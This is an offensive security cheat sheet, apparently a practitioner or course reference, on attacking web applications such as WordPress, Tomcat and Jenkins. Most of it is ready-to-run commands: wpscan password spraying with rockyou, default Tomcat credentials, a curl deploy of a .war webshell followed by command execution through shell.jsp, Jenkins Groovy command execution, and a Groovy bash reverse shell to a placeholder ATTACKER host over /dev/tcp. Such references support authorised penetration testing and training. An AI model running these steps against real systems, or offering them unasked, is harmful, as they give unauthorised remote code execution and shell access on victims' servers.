# Attacking Common Applications

CMS, application servers, devops tooling, etc. Always version fingerprint first.

## General Enumeration
- `whatweb`, `wappalyzer`, `nuclei -t http/technologies/`
- Default creds lists (often in seclists)
- Source / comments / error pages for version and paths

## WordPress / Joomla / Drupal
```bash
wpscan --url http://target/ --enumerate
wpscan --url http://target --password-attack xmlrpc -U users -P rockyou.txt
droopescan scan joomla --url ...
```

Common vulns: plugin/theme vulns, xmlrpc, user enum.

## Tomcat / Manager
- `/manager/html`, `/manager/text`
- Default tomcat:s3cret or from wordlists
- Deploy .war webshell via manager

## Jenkins
- Script console Groovy RCE if admin
- Example Groovy reverse shell (Linux):
```groovy
def cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'".execute()
```

## Other (Splunk, Confluence, etc.)
- Search for known vulns by version.
- Exposed admin panels, default creds.

## 2026
- Use nuclei for fast known-vuln checks: `nuclei -u https://target -t http/ -tags cve`
- Many apps now behind WAF/CDN — focus on logic flaws and chained issues.

### Concrete Examples

```bash
# WordPress plugin vuln hunting
wpscan --url https://target --enumerate p --plugins-detection aggressive -o wpscan.txt

# Jenkins Groovy RCE
# In Script Console:
println "whoami".execute().text

# Tomcat manager deploy
curl -u tomcat:s3cret -T shell.war http://target:8080/manager/text/deploy?path=/evil
curl http://target:8080/evil/shell.jsp?cmd=id
```

See file-upload, command-injection, and web-* sheets.
